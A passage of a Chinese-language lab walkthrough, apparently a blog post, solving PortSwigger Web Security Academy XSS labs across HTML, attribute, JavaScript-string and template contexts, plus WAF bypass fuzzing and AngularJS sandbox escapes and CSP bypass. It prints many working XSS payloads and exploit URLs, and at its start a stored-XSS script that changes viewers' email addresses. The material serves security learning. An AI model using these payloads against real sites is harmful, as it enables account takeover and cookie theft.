    changeReq.send('csrf='+token+'&amp;email=test@test.com')
};
&lt;/script&gt;</code></pre>

<hr/>
part3:
插入XSS
在博客评论中提交payload


这将使任何查看评论的人发出POST请求，将其电子邮件地址更改为test@test.com




---


---


---


## 三、不同上下文中的反射XSS

> 
<h3>1、简述：</h3>
1、反射数据在应用程序响应中的位置、任何验证或其他处理决定了利用它所需的有效负载类型，并且还可能影响漏洞的影响。
<hr/>
2、当测试 反射 和 存储 的XSS时，一个关键任务是识别XSS上下文：
<pre><code>    1、响应中出现攻击者可控制数据的位置。
    2、应用程序对该数据执行的任何输入验证或其他处理。</code></pre>


> 
<h3>2、HTML标记之间的XSS</h3>
当XSS上下文是HTML标记之间的文本时，需要引入一些新的HTML标记来触发JavaScript的执行。
<pre><code>执行JavaScript的一些有用方法包括：
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;img src=1 onerror=alert(1)&gt;</code></pre>
<hr/>
涉及实验：<br/> 实验1：将XSS反射到HTML上下文中，不进行任何编码（前文已解决）<br/> 实验2：将XSS存储到HTML上下文中，不进行任何编码<br/> 实验17：将XSS反射到HTML上下文中，大多数标记和属性被阻止<br/> 实验18：将XSS反射到HTML上下文中，除自定义标记外，所有标记都被阻止<br/> 实验25：具有事件处理程序和 href 已阻止属性<br/> 实验19：允许使用一些SVG标记的反射XSS



> 
<h3>实验2：将XSS存储到HTML上下文中，不进行任何编码</h3>
信息：
本实验的评论功能中存在一个已存储的跨站点脚本漏洞。
要完成此实验，请提交一条评论，以便在查看博客帖子时调用alert函数
<hr/>
part1:
（自己储备好各种XSS的payload）
见框就插（有时候可能会在数据包里面插）
<pre>`&lt;script&gt;alert(1)&lt;/script&gt;`</pre>

返回评论区会弹窗




> 
<h3>实验17：将XSS反射到HTML上下文中，大多数标记和属性被阻止</h3>
信息：
1、本实验在搜索功能中包含一个反映的XSS漏洞，但使用Web应用程序防火墙（WAF）来防范常见的XSS向量。
2、解决实验：执行跨站点脚本攻击，绕过WAF并调用print()函数
3、访问XSS备忘单并单击复制保存（测试过滤器的时候用的[Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)）
<hr/>
part1:
注入标准XSSpayload
<pre>`&lt;img src=1 onerror=print()&gt;`</pre>

 发现失败

<hr/>
part2:
分析数据包，并发送到Burp Intruder

在Burp Intruder中的位置选项卡中，单击"清除§"。将搜索项的值替换为：&lt;&gt;<br/> 将光标放在尖括号之间，点击"Add §"（添加§）两次，创建有效载荷位置。搜索项的值现在应如下所示：&lt;§§&gt;



 测试哪些标记和属性被阻止
 （[Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)）
访问XSS 备忘单并单击“Copy tags to clipboard”

<br/> 在Burp Intruder的"有效负载"选项卡中，单击"粘贴"将标记列表粘贴到有效负载列表中。单击"开始攻击"。

 攻击完成后，查看结果，所有有效负载都导致HTTP 400响应，但body有效负载除外，它导致200响应



<hr/>
part3:
返回Burp Intruder中的Positions选项卡，将搜索词替换为：
<pre>`&lt;body%20=1&gt;`</pre>
将光标放在=字符前，点击"Add §"两次，创建有效载荷位置
<pre>`&lt;body%20§§=1&gt;`</pre>
 <img alt="" height="870" src="https://img-blog.csdnimg.cn/8c75526d60dc44e59ef23dab2797a813.png" width="1200"/>

访问XSS 备忘单并单击“Copy events to clipboard”
[Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

 在Burp Intruder的"有效负载"选项卡中，单击"清除"以删除以前的有效负载。然后单击"粘贴"将属性列表粘贴到有效负载列表中。单击"开始攻击"。

攻击完成后，查看结果。请注意，所有有效负载都会导致HTTP 400响应，只有3个负载导致200响应

<pre><code>payload：
"&gt;&lt;body onresize=print()&gt;
URL编码后：
%22%3E%3Cbody%20onresize=print()%3E</code></pre>

<hr/>
part4:
这里使用onresize负载
转到漏洞利用服务器并粘贴以下代码，将YOUR-LAB-ID替换为自己实验室ID：
（千万别填错了）
<pre><code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'&gt;

我的是：
&lt;iframe src="https://0ae800840376b1b2c158a3ec00860058.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'&gt;</code></pre>
顺序单击"存储"和"向受害者发送利用漏洞攻击"


 <img alt="" height="413" src="https://img-blog.csdnimg.cn/f3325fbff59c4e448d790db7bcea16a1.png" width="1200"/>

 点击view exploit可以看到print效果




---


---


> 
<h3>实验18：将XSS反射到HTML上下文中，除自定义标记外，所有标记都被阻止</h3>
信息：
本实验阻止除自定义标记外的所有HTML标记。
解决实验：执行跨站点脚本攻击，注入自定义标记并自动向document.cookie发出警报
<hr/>
part1：
转到漏洞利用服务器

payload：
<pre><code>payload：
&lt;xss id=x onfocus=alert(document.cookie) tabindex=1&gt;
此注入创建一个ID为x的自定义标记，其中包含一个触发alert函数的onfocus事件处理程序。页面加载后，URL末尾的散列将立即关注此元素，从而导致调用alert负载。

url编码：
%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E</code></pre>

并粘贴以下代码，将YOUR-LAB-ID替换为自己实验室ID：
<pre><code>&lt;script&gt;
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
&lt;/script&gt;

我的是：
&lt;script&gt;
location = 'https://0ad40062044c7721c68463dc008d00f3.web-security-academy.net//?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
&lt;/script&gt;</code></pre>
单击“存储”和“向受害者发送利用漏洞攻击”
（View exploit可以查看）

 <img alt="" height="716" src="https://img-blog.csdnimg.cn/2438415a7ce146aebe1e08b319c948f4.png" width="1200"/>



> 
<h3>实验25：具有事件处理程序和 href 已阻止属性</h3>
信息：
本实验包含一个带有白名单标记的反射XSS漏洞，但所有事件和锚点href属性都被阻止。
要解决实验问题，请执行跨站点脚本攻击，该攻击注入一个向量，单击该向量会调用alert 函数。
需要用单词"Click"标记向量，以便引导模拟实验室用户单击向量。例如：&lt;a href=""&gt;Click me&lt;/a&gt;
<hr/>
part1：
将编码后的payload标签插入到页面中
<pre><code>payload：
%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

URL编码后：
&lt;svg&gt;&lt;a&gt;&lt;animate+attributeName=href+values=javascript:alert(1)+/&gt;&lt;text+x=20+y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</code></pre>

访问以下URL（将YOUR-LAB-ID替换为自己的实验室ID）
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

我的是：
https://0a710019043e9406c0f8452600a40018.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E</code></pre>





> 
<h3>实验19：允许使用一些SVG标记的反射XSS</h3>
信息：
本实验有一个简单的反射XSS漏洞。该站点阻止了常见标记，但遗漏了一些SVG标记和事件。
要完成实验，请执行调用alert()函数的跨站点脚本攻击。
<hr/>
part1:
输入框插入标准XSSpayload
<pre>`&lt;img src=1 onerror=alert(1)&gt;`</pre>

发现失败，被拦截


<hr/>
part2:
分析数据包，并发送到Burp Intruder


在Burp Intruder中的位置选项卡中，单击"清除§"。将搜索项的值替换为：&lt;&gt;<br/> 将光标放在尖括号之间，点击"Add §"（添加§）两次，创建有效载荷位置。搜索项的值现在应如下所示：&lt;§§&gt;



 测试哪些标记和属性被阻止
 （[Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)）
访问XSS 备忘单并单击“Copy tags to clipboard”

<br/> 在Burp Intruder的"有效负载"选项卡中，单击"粘贴"将标记列表粘贴到有效负载列表中。单击"开始攻击"。

 攻击完成后，查看结果，所有有效负载都导致HTTP 400响应，但&lt;svg&gt;,  &lt;animatetransform&gt;,  &lt;title&gt;、&lt;image&gt;有效负载除外，它导致200响应




<hr/>
part3:
返回Burp Intruder中的Positions选项卡，将搜索词替换为：
<pre>`&lt;svg&gt;&lt;animatetransform%20=1&gt;`</pre>
将光标放在=字符前，点击"Add §"两次，创建有效载荷位置
<pre>`&lt;svg&gt;&lt;animatetransform%20§§=1&gt;`</pre>
 <img alt="" height="938" src="https://img-blog.csdnimg.cn/e3eef7d0716f4bef82a62e2f07621a7a.png" width="1200"/>


访问XSS 备忘单并单击“Copy events to clipboard”
[Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

 在Burp Intruder的"有效负载"选项卡中，单击"清除"以删除以前的有效负载。然后单击"粘贴"将属性列表粘贴到有效负载列表中。单击"开始攻击"。

攻击完成后，查看结果。除了onbegin有效负载导致200响应之外，所有有效负载都导致HTTP 400响应。


<pre><code>payload：
"&gt;&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;

URL编码后：
%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E</code></pre>
<hr/>
 part4:
在浏览器中访问以下URL，确认已调用alert()函数且实验已解决：
（将YOUR-LAB-ID替换为自己实验室ID）
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

我的是：
https://0a7400d80446bb60c2e925bb00a80098.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E</code></pre>





---


---


> 
<h3>3、HTML标记属性中的XSS</h3>
1、当XSS上下文进入HTML标记属性值时，有时可以终止属性值，关闭标记，并引入一个新的标记。
<pre><code>例如：
"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
更常见的是尖括号被阻塞或编码，因此输入无法脱离它所在的标记。如果可以终止属性值，通常可以引入一个新属性来创建可编写脚本的上下文，如事件处理程序。
<pre><code>例如：
" autofocus onfocus=alert(document.domain) x="

上面的有效负载创建了一个onfocus事件，当元素接收到焦点时，该事件将执行JavaScript，并且还添加了autofocus属性，以尝试自动触发onfocus事件，而无需任何用户交互。最后，它添加了x=”，以适当地修复以下标记</code></pre>
涉及实验：
实验7：将XSS反射到带尖括号的HTML编码属性中
<hr/>
2、有时候XSS上下文是一种HTML标记属性，它本身可以创建一个脚本上下文。在这里可以执行JavaScript而无需终止属性值。
<pre><code>例如，如果XSS上下文位于href属性，则可以使用 javascript语言执行脚本的伪协议：
&lt;a href="javascript:alert(document.domain)"&gt;</code></pre>
涉及实验：<br/> 实验8：将XSS存储到锚中 href 带双引号的属性HTML编码
<hr/>
3、可能一些网站对尖括号进行编码，但仍然允许注入属性。有时即使在通常不会自动触发事件的标记（如规范标记）中，这些注入也是可能的。可以使用access keys和Chrome上的用户交互来利用此行为。
<pre>`access keys允许提供引用特定元素的键盘快捷键。该accesskey属性允许您定义一个字母，当该字母与其他键（这些键在不同的平台上会有所不同）一起按下时，将引发事件`</pre>
涉及实验：
实验20：规范链接标记中反射的XSS


---


> 
<h3>实验7：将XSS反射到带尖括号的HTML编码属性中</h3>
信息：
此实验包含搜索博客功能中的一个反映的跨站点脚本漏洞，其中尖括号是HTML编码的。要完成此实验，请执行跨站点脚本攻击，注入属性并调用alert函数。
<hr/>
part1：
在搜索框中提交一个随机的字母数字字符串，然后使用Burp Suite拦截搜索请求并将其发送到Burp Repeater
<img alt="" height="867" src="https://img-blog.csdnimg.cn/92f7c513482f402eaad7ffe4292ef406.png" width="1200"/><br/> 观察到随机字符串已反映在带引号的属性中



<hr/>
part2:
将输入替换为以下负载以转义带引号的属性并注入事件处理程序：<br/>  
<pre>`"onmouseover="alert(1)`</pre>

 当鼠标移动到注入的元素上时，应该会触发弹窗




---


> 
<h3>实验8：将XSS存储到锚中 href 带双引号的属性HTML编码</h3>
信息：
本实验的评论功能中存在一个已存储的跨站点脚本漏洞
完成实验：提交一条评论，当评论作者姓名被单击时，该评论将调用alert函数
<hr/>
part1:
在"网站"输入中使用随机字母数字字符串发布评论，然后使用Burp Suite拦截请求并将其发送到Burp Repeater
<img alt="" height="822" src="https://img-blog.csdnimg.cn/f3ea2048ea134054b329b7d91954472d.png" width="1200"/> <img alt="" height="936" src="https://img-blog.csdnimg.cn/490bccce9475483cb40b9b697911a104.png" width="1200"/>
在website中加上字符串后
第二个Repeater选项卡中的随机字符串已反映在href属性中
（各处的输入的数据都是随便填的，为都是查看每个标签的属性）



<hr/>
part2:
将输入替换为以下有效负载，以注入调用alert的JavaScript URL：
<pre><code>payload:
&amp;website=javascript:alert(1)</code></pre>

点击即可弹窗





---


> 
<h3>实验20：规范链接标记中反射的XSS</h3>
信息：
本实验将用户输入反映在规范的链接标记中，并转义尖括号。
完成实验：对主页执行跨站点脚本攻击，注入调用alert函数的属性
为了帮助利用漏洞，可以假设模拟用户将按下以下组合键：
    Alt + Shift + X<br/>     CTRL + ALT + X<br/>     Alt + X
<hr/>
part1:
访问以下URL，将YOUR-LAB-ID替换为您的实验室ID：
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

我的是：
https://0ab1009604362b74c0215423009400cf.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)</code></pre>
这将X键设置为整个页面的访问键。当用户按下访问键时，将调用alert函数

<hr/>
part2：
触发弹窗
要在自己身上触发漏洞利用，请按以下组合键之一：
    在Windows上：ALT + SHIFT + X<br/>     在Mac操作系统上：CTRL + ALT + X<br/>     在Linux上：Alt + X




---


> 
<h3>4、终止现有脚本</h3>
1、在最简单的情况下，可以简单地关闭包含现有JavaScript的script标记，并引入一些新的HTML标记来触发JavaScript的执行。
<pre><code>例如，XSS上下文如下：
&lt;script&gt;
...
var input = 'controllable data here';
...
&lt;/script&gt;

可以使用以下有效负载打破现有JavaScript并执行您自己的JavaScript：
&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;

因为浏览器首先执行HTML解析以识别包含脚本块的页面元素，然后才执行JavaScript解析以理解和执行嵌入的脚本。上面的负载使原始脚本损坏，并带有未终止的字符串文字。但这并不妨碍后续脚本以正常方式解析和执行</code></pre>
<br/> ————
涉及实验：<br/> 实验21：将XSS反射到JavaScript字符串中，并使用单引号和反斜杠进行转义
<hr/>
2、断开JavaScript字符串
如果XSS上下文在一个带引号的字符串文字中，通常可以跳出字符串直接执行JavaScript。必须按照XSS上下文修复脚本，因为其中的任何语法错误都将阻止整个脚本执行。
<pre><code>以下是一些拆分字符串文字的有用方法：
'-alert(document.domain)-'
';alert(document.domain)//</code></pre>

某些应用程序试图通过使用反斜杠转义任何单引号字符来防止输入中断JavaScript字符串。字符前的反斜杠告诉JavaScript解析器应该按字面解释该字符，而不是将其解释为字符串结束符等特殊字符。在这种情况下，应用程序经常会犯无法转义反斜杠字符本身的错误。这意味着攻击者可以使用他们自己的反斜杠字符来中和应用程序添加的反斜杠。
<pre><code>1、例如，假设输入：
';alert(document.domain)//

转换为:
\';alert(document.domain)//


2、可以使用替代有效载荷:
\';alert(document.domain)//

转换为：
\\';alert(document.domain)//

在这里，第一个反斜杠意味着第二个反斜杠按字面解释，而不是作为特殊字符。这意味着引号现在被解释为字符串结束符，因此攻击成功。 </code></pre>
<br/> 涉及实验：
实验9：将XSS反射到带有尖括号的JavaScript字符串HTML编码
实验22：将XSS反射到JavaScript字符串中，使用尖括号和双引号HTML编码并转义单引号
<hr/>
3、一些网站通过限制允许使用的字符来增加XSS的难度。这可以在网站级别上实现，也可以通过部署WAF来阻止请求到达网站。在这些情况下，需要尝试使用其他方法来调用绕过这些安全措施的函数。执行此操作的一种方法是使用 throw 语句和异常处理程序。这使能够在不使用括号的情况下将参数传递给函数。下面的代码将 alert() 函数添加到全局异常处理程序，  throw 语句传递 1 给异常处理程序（在本例中 alert）.最终结果是 alert() 调用函数时使用 1作为论据。
<pre>`onerror=alert;throw 1`</pre>
使用此技术调用不带括号的函数有多种方法
————<br/> 涉及实验：
实验26：JavaScript URL中反射的XSS，其中一些字符被阻止
<hr/>
4、使用HTML编码
当XSS上下文是带引号的标记属性（如事件处理程序）中的一些现有JavaScript时，可以使用HTML编码来处理一些输入过滤器。
当浏览器解析出响应中的HTML标记和属性时，它将在进一步处理标记属性值之前对其执行HTML解码。如果服务器端应用程序阻止或净化了成功利用XSS所需的某些字符，通常可以通过对这些字符进行HTML编码来绕过输入验证。
<pre><code>例如，如果XSS上下文如下所示：
&lt;a href="#" onclick="... var input='controllable data here'; ..."&gt;

并且应用程序阻止或转义单引号字符，则可以使用以下有效负载来打破JavaScript字符串并执行您自己的脚本：
&amp;apos;-alert(document.domain)-&amp;apos;

（序列&amp;apos;是一个HTML实体，表示撇号或单引号。因为浏览器在解释JavaScript之前对onclick属性的值进行HTML解码，所以实体被解码为引号，引号变成字符串分隔符，因此攻击成功）</code></pre>
————
涉及实验：
实验23：将XSS存储到 onclick 带有尖括号和双引号的事件HTML编码的事件以及单引号和反斜杠转义的事件<br/>  
<hr/>
5、JavaScript模板文本中的XSS
JavaScript模板文字是允许嵌入JavaScript表达式的字符串文字。嵌入的表达式将被计算，并通常连接到周围的文本中。模板文本封装在反引号中，而不是普通的引号中，嵌入式表达式使用${...} 语法。
<pre><code>例如，以下脚本将打印包含用户显示名称的欢迎消息：
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;

当XSS上下文进入JavaScript模板文本时，不需要终止文本。相反，只需使用${...} 用于嵌入JavaScript表达式的语法，该表达式将在处理文本时执行。例如，如果XSS上下文如下所示：
&lt;script&gt;
...
var input = `controllable data here`;
...
&lt;/script&gt;

那么可以使用以下有效负载来执行JavaScript，而无需终止模板文本：
${alert(document.domain)}</code></pre>
<br/> 涉及实验：
实验24：将XSS反射到模板文本中，带有尖括号、单引号、双引号、反斜杠和反记号



---


---


> 
<h3>实验21：将XSS反射到JavaScript字符串中，并使用单引号和反斜杠进行转义</h3>
信息：
本实验包含搜索查询跟踪功能中的一个反映的跨站点脚本漏洞。反射发生在JavaScript字符串内部，并转义了单引号和反斜杠。
完成实验：执行跨站点脚本攻击，该攻击会破坏JavaScript字符串并调用alert函数
<hr/>
part1:
在搜索框中提交一个随机的字母数字字符串，然后使用Burp Suite拦截搜索请求并将其发送到Burp Repeater


<br/> 随机字符串已经反映在JavaScript字符串中(script标签)
<img alt="" height="936" src="https://img-blog.csdnimg.cn/373141b8d7174fef8a9e0dbecdb30b88.png" width="1200"/><br/> 尝试跳出引号
<pre><code>payload：
aaaa'aaaaa</code></pre>
观察到单引号被反斜杠转义，从而防止您跳出字符串
 <img alt="" height="936" src="https://img-blog.csdnimg.cn/f382ba341bed45cba03406c1931226d3.png" width="1200"/>
<hr/>
part2:
 跳出脚本块并注入新脚本：
<pre>`&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;`</pre>


插入搜索框

直接弹窗




---


> 
<h3>实验9：将XSS反射到带有尖括号的JavaScript字符串HTML编码</h3>
信息：
本实验包含搜索查询跟踪功能中的一个反映的跨站点脚本漏洞，其中尖括号被编码。反射发生在JavaScript字符串内部。
完成实验：执行跨站点脚本攻击，该攻击会破坏JavaScript字符串并调用alert函数。
<hr/>
part：
在搜索框中提交一个随机的字母数字字符串
随机字符串已经反映在JavaScript字符串中


<hr/>
part2：
插入XSS
使用以下有效负载插入，以断开JavaScript字符串并注入警报：
<pre>`'-alert(1)-'`</pre>



 完成实验




---


> 
<h3>实验22：将XSS反射到JavaScript字符串中，使用尖括号和双引号HTML编码并转义单引号</h3>
信息：
本实验包含搜索查询跟踪功能中的一个反映的跨站点脚本漏洞，其中尖括号和双引号是HTML编码的，而单引号是转义的。
完成实验：执行跨站点脚本攻击，该攻击会破坏JavaScript字符串并调用alert函数。
<hr/>
part1：
在搜索框中提交一个随机的字母数字字符串



随机字符串已经反映在JavaScript字符串中。<br/> 尝试发送测试的payload观察转义情况
<pre>`aaaaaa'aaaaaa`</pre>
观察到单引号被反斜杠转义，从而防止跳出字符串


尝试发送payload:aaa\aaaa，并注意反斜杠没有转义


<hr/>
part2:
用以下有payload插入，以断开JavaScript字符串并注入alert函数
<pre>`\'-alert(1)//`</pre>


 完成实验




---


> 
<h3>实验26：JavaScript URL中反射的XSS，其中一些字符被阻止</h3>
信息：
本实验反映了在JavaScript URL中的输入，但并非一切都像看上去的那样。这最初看起来像是一个微不足道的挑战，但应用程序阻止了一些字符，试图防止XSS攻击
解决实验：执行跨站点脚本攻击，该攻击使用alert消息中某处包含的字符串1337调用alert函数
<hr/>
part1:
payload：
<pre>`5&amp;'},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`</pre>
URL编码：
<pre>`5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`</pre>
利用漏洞攻击使用异常处理调用带有参数的alert函数。使用throw语句，用一个空白注释分隔，以绕过没有空格的限制。alert函数被分配给onerror异常处理程序。
由于throw是一个语句，因此不能用作表达式。相反需要使用箭头函数来创建一个块，以便可以使用throw语句。然后需要调用这个函数，所以将它赋给window的toString属性，并通过强制window进行字符串转换来触发它。
<hr/>
part2：
插入XSS
访问以下URL(将YOUR-LAB-ID替换为您的实验室ID)
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

我的是：
https://0a33007103190c60c234a9f2008b003c.web-security-academy.net/post?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27</code></pre>
实验得到解决

 在单击页面底部的“返回博客”时才会调用alert函数




---


> 
<h3>实验23：将XSS存储到onclick事件中，使用尖括号和双引号HTML编码，使用单引号和反斜杠转义</h3>
信息：
本实验的评论功能中存在一个已存储的跨站点脚本漏洞。
完成实验：提交一条评论，当评论作者姓名被单击时，该评论将调用alert函数
<hr/>
part1:
在"网站"输入中使用随机字母数字字符串发布评论<img alt="" height="843" src="https://img-blog.csdnimg.cn/a0b17164cd094fb38be46d23fe31954a.png" width="1200"/><br/> 刷新页面，在HTTP历史记录中观看
（随机字符串已反映在onclick事件处理程序属性中）
 <img alt="" height="936" src="https://img-blog.csdnimg.cn/f49b43e7434e48269215e5c81f31d9a4.png" width="1200"/>
<hr/>
part2：
插入XSS
将评论的请求发送的repeater，最终的注入点在website
使用以下有效负载修改输入以注入调用alert的JavaScript URL：<br/>  
<pre>`http://foo?&amp;apos;-alert(1)-&amp;apos;`</pre>



触发弹窗




---


> 
<h3>实验24：将XSS反射到模板文本中，带有尖括号、单引号、双引号、反斜杠和反记号</h3>
信息：
本实验包含搜索博客功能中的一个反映的跨站点脚本漏洞。反射发生在一个模板字符串中，该模板字符串带有尖括号、单引号和双引号，HTML编码，反引号转义
完成实验：执行跨站点脚本攻击，调用模板字符串中的alert函数
<hr/>
part1:
在搜索框中提交一个随机的字母数字字符串
随机字符串已经反映在JavaScript模板字符串中



将输入替换为以下有效负载以在模板字符串内执行
<pre>`JavaScript:${alert(1)}`</pre>
直接输入框输入

直接弹窗了




---


---


## 四、客户端模板注入

### 1、简述：

当使用客户端模板框架的应用程序在网页中动态嵌入用户输入时，会出现客户端模板注入漏洞。呈现页面时，框架扫描页面以查找模板表达式，并执行遇到的任何模板表达式。攻击者可以通过提供恶意模板表达式来攻击此漏洞，从而启动跨站点脚本（XSS）攻击。 

<br/>  

> 
<h3> 2、AngularJS沙盒</h3>
1、是一种机制：可防止访问AngularJS模板表达式中具有潜在危险的对象，如window或document（窗口或文档）。它还阻止访问具有潜在危险的属性，如__proto__。虽然绕过沙箱最初很有挑战性，但安全研究人员已经发现了许多方法。因此最终在1.6版的AngularJS中被删除。但许多遗留应用程序仍然使用旧版本的AngularJS，因此可能容易受到攻击。 
<hr/>
2、沙箱的工作原理：即解析表达式，重写JavaScript，然后使用各种函数测试重写的代码是否包含任何危险对象。例如， ensureSafeObject()函数检查给定对象是否引用自身。这是一种检测window对象，
<pre><code>例如。该Function（功能）构造函数的检测方法大致相同，即检查构造函数属性是否引用自身。

ensureSafeMemberName （） 函数检查对象的每个属性访问，如果它包含危险属性（如__proto__或__lookupGetter__），则将阻止对象。ensureSafeFunction （） 函数防止 调用call（） 、apply（）、bind（）或constructor（）。</code></pre>
<hr/>
3、AngularJS沙盒逃逸
 沙箱逃逸涉及欺骗沙箱，使其认为恶意表达式是良性的。
<pre><code>最著名的转义在表达式中全局使用修改后的charAt()函数：
'a'.constructor.prototype.charAt=[].join</code></pre>
<pre><code>当它最初被发现时，AngularJS并没有阻止这种修改。攻击者使用 [].join方法覆盖函数，导致charAt()函数返回发送给它的所有字符，而不是特定的单个字符。由于AngularJS中isIdent()函数的逻辑，它会将它认为是单个字符的内容与多个字符的内容进行比较。由于单个字符始终少于多个字符，因此isIdent()函数始终返回true

如下例所示：
isIdent = function(ch) {
    return ('a' &lt;= ch &amp;&amp; ch &lt;= 'z' || 'A' &lt;= ch &amp;&amp; ch &lt;= 'Z' || '_' === ch || ch === '$');
}
isIdent('x9=9a9l9e9r9t9(919)')

一旦 isIdent()函数被骗，就可以注入恶意JavaScript。例如，可以使用$eval('x =alert(1)')这样的表达式，因为AngularJS将每个字符都视为标识符。注意，我们需要使用AngularJS的$eval()函数，因为覆盖charAt()函数只有在沙箱代码执行后才会生效。这种技术将绕过沙箱并允许任意JavaScript执行</code></pre>
<hr/>
4、构造高级AngularJS沙盒转义
可能会遇到对允许使用哪些字符有更多限制的站点。如某个站点可能禁止使用双引号或单引号。在这种情况下，需要使用String.fromCharCode()之类的函数来生成字符。尽管AngularJS阻止访问表达式中的String构造函数，但可以通过使用字符串的constructor属性来解决这个问题。这显然需要一个字符串，因此要构造这样的攻击，需要找到一种不使用单引号或双引号创建字符串的方法。
<pre><code>在标准沙箱转义中，将使用 $eval()来执行JavaScript负载，但在下面的实验中，$eval()函数未定义。可以使用orderBy过滤器代替。
典型语法orderBy过滤器如下：
[123]|orderBy:'Some string'</code></pre>
| 运算符的含义与JavaScript中的含义不同。这是一个按位OR操作，但在AngularJS中，它表示一个过滤操作。 OR操作，但在AngularJS中，它表示过滤器操作.在上面的代码中，将左边的数组[123]发送到右边的orderBy过滤器。 [123] 在左边到 orderBy 在右边过滤器。冒号表示要发送给筛选器的参数，在本例中为字符串。orderBy过滤器通常用于对对象进行排序，但它也接受表达式，这意味着可以使用它来传递有效负载。
————
涉及实验：<br/> 实验27：反射的XSS，带AngularJS沙箱转义，不带字符串



---


> 
<h3>实验27：反射的XSS，带AngularJS沙箱转义，不带字符串</h3>
信息：
本实验以一种不寻常的方式使用AngularJS，其中$eval函数不可用，将无法在AngularJS中使用任何字符串。
解决实验：执行一个跨站点脚本攻击，该攻击可以跳出沙箱并在不使用$eval函数的情况下执行alert函数
<hr/>
part1：
payload：
访问以下URL（将YOUR-LAB-ID替换为您的实验室ID）
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

我的是：
https://0a51002503946316c0db0cb800f300d2.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1</code></pre>
<hr/>
原理：
1、该漏洞利用使用toString()创建不使用引号的字符串。然后获取String原型并为每个字符串重写charAt函数。这有效地打破了AngularJS沙箱。
2、将数组传递给orderBy筛选器。
3、再次使用toString()创建一个字符串和String构造函数属性来设置过滤器的参数。
4、使用fromCharCode方法将字符代码转换为字符串x=alert(1)，从而生成有效负载。因为charAt函数已被覆盖，AngularJS将允许此代码，而通常不会允许此代码




---


> 
<h3> 3、AngularJS CSP旁路</h3>
1、内容安全策略（CSP）绕过的工作方式与标准沙箱转义类似，但通常涉及一些HTML注入。当CSP模式在AngularJS中处于活动状态时，它以不同的方式解析模板表达式，并避免使用Function构造函数。这意味着上面描述的标准沙箱转义将不再起作用。
<hr/>
2、根据特定的策略，CSP将阻止JavaScript事件。但是，AngularJS定义了自己的事件，可以替代使用。在事件内部时，AngularJS定义一个特殊的 `$event`对象，该对象仅引用浏览器事件对象。可以使用此对象执行CSP绕过。在Chrome上，有一个特殊的属性 `$event/event` 对象调用`path`。此属性包含导致事件执行的对象数组。最后一个属性始终是`window`对象，我们可以使用它来执行沙箱转义。通过将此数组传递给`orderBy`过滤器，我们可以枚举数组并使用最后一个元素（`window`对象）来执行全局函数，例如`alert()`。
<pre><code>下面的代码演示了这一点：
&lt;input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'"&gt;</code></pre>
<br/> 这里使用了from()函数，它允许您将对象转换为数组，并对该数组的每个元素调用给定函数（在第二个参数中指定）。在本例中，调用alert()函数。不能直接调用函数，因为AngularJS沙盒会解析代码并检测到`window`对象正被用于调用函数。相反，使用 from()函数可以有效地隐藏沙箱中的`window`对象，从而允许注入恶意代码
<hr/>
3、使用AngularJS沙箱转义绕过CSP
